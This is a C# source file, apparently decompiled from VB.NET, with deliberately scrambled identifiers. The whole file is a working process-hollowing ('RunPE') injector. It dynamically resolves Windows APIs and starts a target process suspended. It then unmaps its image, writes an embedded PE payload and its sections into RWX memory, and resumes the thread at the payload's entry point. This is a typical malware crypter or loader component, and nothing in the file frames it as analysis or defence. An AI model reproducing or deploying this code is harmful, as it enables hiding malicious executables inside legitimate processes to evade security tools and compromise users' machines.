using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class znlXJLcnJjzKttzmuDmeLppykjRGKeoffCfnWsXbXCV
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool yjKCEKNSxSmOPOTYhkzPa(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, uint[] Part2);

	public delegate uint UZETQNWgwjqtMiOcV(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq);

	public delegate uint AOeMoIlrOANLTIozWNwWazIgdJgSKzVkQWzcP(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, IntPtr Part2);

	public delegate IntPtr ZUvqCJPfHoEmdSEpQXxAgKmIYoShSaQaqIYzmXiUrbdbIdkeoitCmyg(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool vQxjEnBZhPFdgGlxuKChMK(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, uint[] Part2);

	public delegate bool FvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool FqGQACoexRucRnPgUqYNZwRRVvYCK(IntPtr GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool WpbgSLrHqGdoZYkPcuzthUSUWDPuKLlLjkwBLVvxM(string GpyFFcvwucypcMHjnFRCHskXmuPmqCUq, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] GpyFFcvwucypcMHjnFRCHskXmuPmqCUq0);

	private static yjKCEKNSxSmOPOTYhkzPa yjKCEKNSxSmOPOTYhkzPa_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<yjKCEKNSxSmOPOTYhkzPa>("kernel32", "SetThreadContext");

	private static UZETQNWgwjqtMiOcV uzetqnwgwjqtMiOcV_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<UZETQNWgwjqtMiOcV>("kernel32", "ResumeThread");

	private static AOeMoIlrOANLTIozWNwWazIgdJgSKzVkQWzcP aoeMoIlrOANLTIozWNwWazIgdJgSKzVkQWzcP_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<AOeMoIlrOANLTIozWNwWazIgdJgSKzVkQWzcP>("ntdll", "NtUnmapViewOfSection");

	private static ZUvqCJPfHoEmdSEpQXxAgKmIYoShSaQaqIYzmXiUrbdbIdkeoitCmyg zuvqCJPfHoEmdSEpQXxAgKmIYoShSaQaqIYzmXiUrbdbIdkeoitCmyg_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<ZUvqCJPfHoEmdSEpQXxAgKmIYoShSaQaqIYzmXiUrbdbIdkeoitCmyg>("kernel32", "VirtualAllocEx");

	private static vQxjEnBZhPFdgGlxuKChMK vQxjEnBZhPFdgGlxuKChMK_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<vQxjEnBZhPFdgGlxuKChMK>("kernel32", "GetThreadContext");

	private static FvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe fvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<FvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe>("kernel32", "WriteProcessMemory");

	private static FqGQACoexRucRnPgUqYNZwRRVvYCK fqGQACoexRucRnPgUqYNZwRRVvYCK_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<FqGQACoexRucRnPgUqYNZwRRVvYCK>("kernel32", "ReadProcessMemory");

	private static WpbgSLrHqGdoZYkPcuzthUSUWDPuKLlLjkwBLVvxM wpbgSLrHqGdoZYkPcuzthUSUWDPuKLlLjkwBLVvxM_0 = FwRghfgCpKDRMHfrrZajrwroZYEm<WpbgSLrHqGdoZYkPcuzthUSUWDPuKLlLjkwBLVvxM>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T FwRghfgCpKDRMHfrrZajrwroZYEm<T>(string yXGyMmP, string lrnCHXPVRNFioZxrZxxrpcDESwoahi)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref yXGyMmP), ref lrnCHXPVRNFioZxrZxxrpcDESwoahi), typeof(T));
	}

	public static bool XiTFdlOaOxlBXecXjiSQVgJqMcaqYMV(byte[] eBWLJEBSPahDpPfTaczJZ, string xCZVdLDfaGTqjTiEejpmsfLHqSTqevNf)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(eBWLJEBSPahDpPfTaczJZ, 60);
				int num2 = BitConverter.ToInt16(eBWLJEBSPahDpPfTaczJZ, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(eBWLJEBSPahDpPfTaczJZ, num + 84));
				if (wpbgSLrHqGdoZYkPcuzthUSUWDPuKLlLjkwBLVvxM_0(null, new StringBuilder(xCZVdLDfaGTqjTiEejpmsfLHqSTqevNf), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (vQxjEnBZhPFdgGlxuKChMK_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((fqGQACoexRucRnPgUqYNZwRRVvYCK_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)aoeMoIlrOANLTIozWNwWazIgdJgSKzVkQWzcP_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(eBWLJEBSPahDpPfTaczJZ, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(eBWLJEBSPahDpPfTaczJZ, num + 80));
							IntPtr part5 = zuvqCJPfHoEmdSEpQXxAgKmIYoShSaQaqIYzmXiUrbdbIdkeoitCmyg_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							fvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe_0(array[0], part5, eBWLJEBSPahDpPfTaczJZ, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(eBWLJEBSPahDpPfTaczJZ, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(eBWLJEBSPahDpPfTaczJZ, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								fvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							fvGhuCYdWmqcfFPcgSyfTgtBxVEqcBQKYQafZntoYhBIFiXdCiOANe_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(eBWLJEBSPahDpPfTaczJZ, num + 40));
							yjKCEKNSxSmOPOTYhkzPa_0(array[1], array2);
						}
					}
					uzetqnwgwjqtMiOcV_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
